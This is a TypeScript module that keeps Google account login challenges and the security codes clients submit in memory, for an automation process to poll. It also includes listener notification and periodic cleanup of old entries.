/**
 * Challenge Store
 *
 * Simple in-memory storage for Google account login challenges.
 * Stores challenge info and codes submitted by clients.
 */

interface ChallengeData {
    email: string;
    timestamp: number;
    type?: string;
}

interface ChallengeCode {
    email: string;
    code: string;
    timestamp: number;
}

class ChallengeStore {
    private challenges: Map<string, ChallengeData> = new Map();
    private codes: Map<string, ChallengeCode> = new Map();
    private listeners: Map<string, Set<(data: ChallengeData) => void>> = new Map();

    /**
     * Store a new challenge
     */
    storeChallenge(email: string, type: string = "security_code"): void {
        const data: ChallengeData = {
            email,
            type,
            timestamp: Date.now(),
        };
        this.challenges.set(email, data);

        // Notify listeners (for SSE)
        this.notifyListeners(data);

        console.log(`📧 Challenge stored for ${email}`);
    }

    /**
     * Get challenge by email
     */
    getChallenge(email: string): ChallengeData | null {
        return this.challenges.get(email) || null;
    }

    /**
     * Store code submitted by client
     */
    storeCode(email: string, code: string): void {
        this.codes.set(email, {
            email,
            code,
            timestamp: Date.now(),
        });
        console.log(`🔑 Code stored for ${email}`);
    }

    /**
     * Get code by email (for automation polling)
     */
    getCode(email: string): string | null {
        const data = this.codes.get(email);
        if (data) {
            // Remove after retrieval to prevent reuse
            this.codes.delete(email);
            return data.code;
        }
        return null;
    }

    /**
     * Clear challenge and code for email
     */
    clear(email: string): void {
        this.challenges.delete(email);
        this.codes.delete(email);
        console.log(`🗑️ Challenge cleared for ${email}`);
    }

    /**
     * Add listener for SSE
     */
    addListener(id: string, callback: (data: ChallengeData) => void): void {
        if (!this.listeners.has(id)) {
            this.listeners.set(id, new Set());
        }
        this.listeners.get(id)!.add(callback);
    }

    /**
     * Remove listener
     */
    removeListener(id: string, callback: (data: ChallengeData) => void): void {
        const callbacks = this.listeners.get(id);
        if (callbacks) {
            callbacks.delete(callback);
            if (callbacks.size === 0) {
                this.listeners.delete(id);
            }
        }
    }

    /**
     * Notify all listeners (for SSE broadcast)
     */
    private notifyListeners(data: ChallengeData): void {
        this.listeners.forEach((callbacks) => {
            callbacks.forEach((callback) => {
                try {
                    callback(data);
                } catch (error) {
                    console.error("Error notifying listener:", error);
                }
            });
        });
    }

    /**
     * Get all active challenges
     */
    getAllChallenges(): ChallengeData[] {
        return Array.from(this.challenges.values());
    }

    /**
     * Clean up old challenges (older than 5 minutes)
     */
    cleanup(): void {
        const now = Date.now();
        const maxAge = 5 * 60 * 1000; // 5 minutes

        for (const [email, data] of this.challenges.entries()) {
            if (now - data.timestamp > maxAge) {
                this.clear(email);
            }
        }
    }
}

// Export singleton instance
export const challengeStore = new ChallengeStore();

// Auto cleanup every minute
setInterval(() => {
    challengeStore.cleanup();
}, 60 * 1000);
